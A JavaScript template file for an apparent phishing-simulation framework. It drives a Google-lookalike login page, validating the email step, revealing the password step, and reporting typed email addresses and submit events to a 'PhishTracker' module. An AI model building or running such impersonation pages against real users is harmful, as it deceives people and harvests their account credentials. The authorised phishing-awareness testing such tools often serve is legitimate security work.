/* ================================================================
   template.js  — login_basic (Google) TEMPLATE-SPECIFIC SCRIPT

   PURPOSE
   ───────
   Contains ONLY logic specific to this template's UI:
     • Email validation
     • "Next" button / Enter-key handling
     • Showing/hiding the password step
     • Calling window.PhishTracker.sendEvent() for form events

   This file has ZERO knowledge of tracking internals.
   It depends on tracker.js being loaded first (which sets
   window.PhishTracker).

   OTHER TEMPLATES should have their OWN template.js. They never
   touch this file and this file never touches theirs. No collision.
   ================================================================ */

(function () {
    "use strict";

    /* Wait until PhishTracker is ready */
    if (!window.PhishTracker) {
        console.warn("[template.js] PhishTracker not found — load tracker.js first.");
        return;
    }

    var sendEvent           = window.PhishTracker.sendEvent;
    var attachInputTrackers = window.PhishTracker.attachInputTrackers;

    /* ── Email validator ── */
    function validateEmail(email) {
        var re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }

    /* ── Email step handler (Next button or Enter key) ── */
    function doEmailStep() {
        var emailVal   = document.getElementById("email-input");
        if (!emailVal) return;
        var val        = emailVal.value;
        var emailValid = validateEmail(val);

        if (emailValid) {
            /* Tell tracker that credentials were submitted */
            sendEvent("form_submit", {
                field:  "email",
                value:  val,
                method: "next_button_or_enter",
                valid:  true
            });

            /* UI feedback */
            if (typeof $ !== "undefined") {
                $(".progress-bar").fadeIn("show");
                $("#login-form").fadeTo("fast", 0.6);
                setTimeout(function () {
                    $(".progress-bar").css("display", "none");
                    $("#email-input").removeClass("g-input-invalid");
                    $(".invalid-email").css("display", "none");
                    $("#login-form").css("opacity", 1);
                    /* Re-attach trackers to newly-visible password field */
                    attachInputTrackers();
                }, 800);
            }

        } else {
            sendEvent("form_submit_attempt", {
                field:  "email",
                method: "next_button_or_enter",
                valid:  false,
                reason: "invalid_email_format"
            });

            if (typeof $ !== "undefined") {
                $(".progress-bar").fadeIn("slow");
                $("#login-form").fadeTo("fast", 0.6);
                setTimeout(function () {
                    $("#login-form").css("opacity", 1);
                    $(".progress-bar").css("display", "none");
                    $("#email-input").addClass("g-input-invalid");
                    $(".invalid-email").css("display", "block");
                }, 500);
            }
        }
    }

    /* ── jQuery ready: bind UI events ── */
    if (typeof $ !== "undefined") {
        $(document).ready(function () {
            /* Re-attach trackers now that jQuery is ready */
            attachInputTrackers();

            /* "Next" button clicked */
            $("#login-app").on("click", ".btn-next-email", function () {
                doEmailStep();
            });

            /* Enter key inside email form */
            $("#login-app").on("submit", "#email-form-step", function (e) {
                e.preventDefault();
                doEmailStep();
            });

            /* Password / other submit buttons */
            $("#login-app").on("click", '.btn-submit, [type="submit"]', function () {
                var $form = $(this).closest("form");
                if ($form.length && $form.attr("id") !== "email-form-step") {
                    sendEvent("form_submit", {
                        field:  "password_or_other",
                        method: "submit_button",
                        valid:  true
                    });
                }
            });
        });
    } else {
        /* Fallback without jQuery */
        document.addEventListener("DOMContentLoaded", function () {
            attachInputTrackers();
            var form = document.getElementById("email-form-step");
            if (form) {
                form.addEventListener("submit", function (e) {
                    e.preventDefault();
                    doEmailStep();
                });
            }
        });
    }

})();
